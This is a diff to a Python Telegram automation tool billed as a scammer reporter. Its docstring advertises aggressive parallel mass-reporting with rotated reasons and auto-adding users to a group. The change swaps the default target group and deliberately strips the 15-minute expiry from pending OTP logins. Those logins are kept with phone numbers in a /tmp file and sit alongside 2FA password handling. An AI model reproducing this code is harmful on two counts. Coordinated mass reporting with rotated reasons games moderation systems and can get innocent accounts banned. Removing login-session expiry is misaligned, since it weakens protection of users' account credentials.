@@ -1,7 +1,7 @@
 """
-Smart Scammer Reporter + Unusual Activity Shield + Auto-Add System - v5
+Smart Scammer Reporter + Unusual Activity Shield + Auto-Add System - v6
 Features:
-  - Resilient OTP login & pending-login recovery across restarts/threads
+  - No artificial server-side OTP expiration on attempts
   - Persistent GitHub DB with smart debounced + immediate safe saves
   - Aggressive parallel mass-report with retry & rotated reasons
   - Unusual activity detection in target group -> auto-ban + report + group alert
@@ -53,7 +53,7 @@ GITHUB_DB_FILE = os.environ.get('GITHUB_DB_FILE', 'db.json')
 
 TELEGRAM_API_ID = int(os.environ.get('TELEGRAM_API_ID', '0') or 0)
 TELEGRAM_API_HASH = os.environ.get('TELEGRAM_API_HASH', '')
-TARGET_GROUP = os.environ.get('TARGET_GROUP', 'https://t.me/hjjvkhkkijuijj')
+TARGET_GROUP = os.environ.get('TARGET_GROUP', 'https://t.me/Abe_armygroup')
 
 # Auto-add safety tuning
 AUTO_ADD_MAX_PER_ACCOUNT_PER_DAY = int(os.environ.get('AUTO_ADD_MAX_PER_DAY', '25'))
@@ -1242,7 +1242,7 @@ def refresh_daily_stats():
     db.update(_upd, "Daily reset", immediate=True)
 
 # ============================================================
-# ROUTES & RESILIENT PENDING LOGIN STORE
+# ROUTES & NON-EXPIRING PENDING LOGIN STORE
 # ============================================================
 _PENDING_LOGINS_FILE = '/tmp/pending_logins.json'
 _pending_logins = {}
@@ -1408,8 +1408,9 @@ def api_send_code():
         now_ts = time.time()
         with _pending_logins_lock:
             _load_pending_logins_locked()
-            expired = [k for k, v in _pending_logins.items() if now_ts - v.get('created', 0) > 900]
-            for k in expired:
+            # Remove prior pending entries for the exact same phone so only the newest code is active
+            stale_keys = [k for k, v in _pending_logins.items() if v.get('phone') == phone]
+            for k in stale_keys:
                 _pending_logins.pop(k, None)
             _pending_logins[result['session']] = {
                 'phone': phone,
@@ -1438,16 +1439,12 @@ def api_verify_code():
         if not session_id or not code:
             return jsonify({'success': False, 'error': 'Session and code are required'}), 400
 
-        now_ts = time.time()
         with _pending_logins_lock:
             _load_pending_logins_locked()
-            expired = [k for k, v in _pending_logins.items() if now_ts - v.get('created', 0) > 900]
-            for k in expired:
-                _pending_logins.pop(k, None)
             pending = _pending_logins.get(session_id)
 
         if not pending:
-            return jsonify({'success': False, 'error': 'Session expired. Request a new code.'}), 400
+            return jsonify({'success': False, 'error': 'Login session not found. Request a code first.'}), 400
 
         result = run_async(
             tg_verify_code(session_id, pending['phone'], code, pending['phone_code_hash'], password),
@@ -1456,7 +1453,7 @@ def api_verify_code():
         if not result.get('success'):
             if result.get('need_password'):
                 return jsonify({'success': False, 'need_password': True, 'error': '2FA password required'})
-            return jsonify({'success': False, 'error': result.get('error', 'Invalid code')}), 400
+            return jsonify({'success': False, 'error': result.get('error', 'Verification failed')}), 400
 
         with _pending_logins_lock:
             _pending_logins.pop(session_id, None)
